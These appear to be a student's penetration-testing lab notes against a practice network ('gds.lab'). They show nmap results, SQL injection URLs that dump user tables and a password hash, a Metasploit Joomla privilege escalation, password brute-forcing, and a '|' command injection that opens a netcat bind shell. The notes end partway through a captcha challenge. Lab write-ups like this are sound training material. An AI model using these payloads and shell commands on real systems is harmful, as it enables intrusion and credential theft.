
Starting Nmap 7.31 ( https://nmap.org ) at 2016-11-26 15:15 MST
Nmap scan report for gds.lab (192.168.101.9)
Host is up (0.40s latency).
Not shown: 995 filtered ports
PORT     STATE SERVICE    VERSION
22/tcp   open  tcpwrapped
25/tcp   open  tcpwrapped
80/tcp   open  http       nginx 1.10.1
443/tcp  open  http       nginx 1.2.1
8100/tcp open  http       CommuniGate Pro httpd 6.0.9

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.90 seconds

from http://store.gds.lab:443/contact.php:

Scott Locklear - s.locklear@gds.lab
Joshua Wise - j.wise@gds.lab


openvas_connect admin (omitted) localhost 9390

timezone: GMT +2 (likely)

use auxiliary/admin/http/netgear_soap_password_extractor  on 192.168.101.9:443

http://192.168.101.9:443/post.php?id=-1%27%29%20UnIoN%20SelEct%201,%20@@veRsion%20--%20-
	gives database version:
	5.5.53-0+deb7u1

http://192.168.101.9:443/post.php?id=-1%27%29%20UnIoN%20SelEct%20-1,uSeR%28%29%20--%20-
	current user = user@localhost  



http://192.168.101.9:443/post.php?id=-1') UNiOn seLeCT -1, GrouP_CONcaT(TabLe_nAmE) FroM InfOrMatIoN_scHemA.TabLes WheRe TabLe_sCheMa=database() -- -
	table names = posts, users

http://192.168.101.9:443/post.php?id=-1') UNIOn seLeCT -1, GroUP_CoNcaT(ColuMn_nAmE) FRom InfOrMatIoN_scHemA.ColUmns WheRe tAbLe_NaME='users' -- -
	column names = id, username, password


http://192.168.101.9:443/post.php?id=-1%27%29%20UNIOn%20aLL%20%28sEleCt%20usERnaMe,%20pAsswOrd%20fRoM%20users%20%29%20--%20-
	CREDS:
		uname: e.lindsey
		password:$1$w9aURG9k$Wf1VIpv9VET3v3VWZ4YD8. --> (omitted) (via Hashcat)
 
login to: 192.168.101.9:443/admin?login.php:

	BLOG TOKEN :	zi2ahm1A

		uname: a.modlin
		password: (omitted) (via Hydra)

	MAIL TOKEN:	Ge5Ta2Ah
	
	

tl10-ssh TOKEN:  USING findDir.py --> cat /data/users/rross/docs/token.txt --> miaM3aib

a.modlin.key --> cat /data/users/a.modlin/docs/key
rross.key --> cat /data/users/rross/docs/keys


a.modlin's email account @ 192.168.101.9:8100:
    download gds-authenticator.apk
    unzip --> get classes with dex2jar --> use jd-gui decompiler to see classes
    
    try to compile this shit. later. java is annoying.
    
MOVING ON 

BLOG:
    
    use sshuttle to log in
	cd sshuttle/
	./run -r e.lindsey@192.168.101.9 192.168.0.4

	open on 192.168.0.4 as per network diagram:
    
    it appears Joomla! is running as the blog's content management system
    
    <meta name="generator" content="Joomla! - Open Source Content Management" />
    
    researching Joomla! tells us that you can access an administraor pannel with /administrator
    try and exploit this:
    
    metasploit:
        search joomla:
        
        interesting: auxiliary/admin/http/joomla_registration_privesc
                        Joomla Account Creation and Privilege Escalation ~ 2016
                        
                        apparently this exploit relies on a missing (but still expected) method
                        previously found in the user.php controller within Joomla source code 
                        (Oct 2016 release) this exploit modifies a request to originate 
                        from a "user" (account creation). This newly created user 
                        is then added to the admin group (privilege escalation)
                                
        use auxiliary/admin/http/joomla_registration_privesc
        set RHOST 192.168.0.4
        set email e.lindsey@gds.lab
        set USERNAME hahaha
        set PASSWORD (omitted)
        run
        
        login to 192.168.0.4/administrator with your credentials
        IT WORKS. this is probably not going to happen in real life though.
        Articles -- > token: ri9ahcae
        


WEB CONTROL:

ssh e,lindsey@192.168.101.9
nmap -sV 192.168.0.6
    an open port at 1503...
nc 192.168.0.6 1503
    Enter Login:
    Enter Password:
    
        looks like a simple login checker. time to brute force

python web_control.py
    a simple brute forcer I wrote using John the Ripper password list
    --> uname: admin, pword : (omitted)
    
    brings us to this:
    
        Select option:
	    1. First script
	    2. Second script
	    3.Third script

        To exit type -1.
        Option:
        
    wtf
    
escaped characters are blocked, except |
these scripts are probably being executed via "./script1", etc
try to inject something using |:

3 | nc -lnp 4200 -e /bin/bash --> use netcat to tunell throguh spawn a bash shett ar port 4200, where we can see more


--> ssh e.lindsey@192.168.101.9
--> nc 192.168.0.6 4200
gives access to a bash terminal

plain guessed this:

find / | grep token.txt
--> /var/opt/token.txt
    web_control token: Yaelai9u
    
also:

cd /opt/web_control
cat script1.sh
/etc/init.d/mysql start
cat script2.sh
/etc/init.d/mysql stop
cat script3.sh
/etc/init.d/mysql restart
cat launch.sh
#!/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/opt/web_control
declare -i ret
ret=$(ps aux | grep multiThread.py | wc -l)
if [ $ret -gt 1 ]
then {
    echo "Script is running!"
    exit 1
}
else {
    python /opt/web_control/multiThread.py
    exit 1
}
fi;

also
MultiThread.py

CATPCHA:

nothing from nmap, try dirsearch
~/sshuttle# ./run -r e.lindsey@192.168.101.9 192.168.0.7
./dirsearch.py -u http://192.168.0.7 -e php
-->
Target: http://192.168.0.7

[19:55:04] Starting: 
[19:57:33] 200 -  303B  - /index.php
[19:58:14] 200 -   75B  - /readme.txt
[19:58:16] 200 -   30B  - /robots.txt

/readme.txt --> "Notice: don't forget - destroy all cached captcha every %time% via system."
    
/robots.txt--> User-agent: *
               Disallow: *.bak
               
/sources/ --> 403 Forbidden ...

examine captcha (/ --> /readme.txt
PHPSESSID=qou9a5areovemmq7pifbu4a1q1



        
        





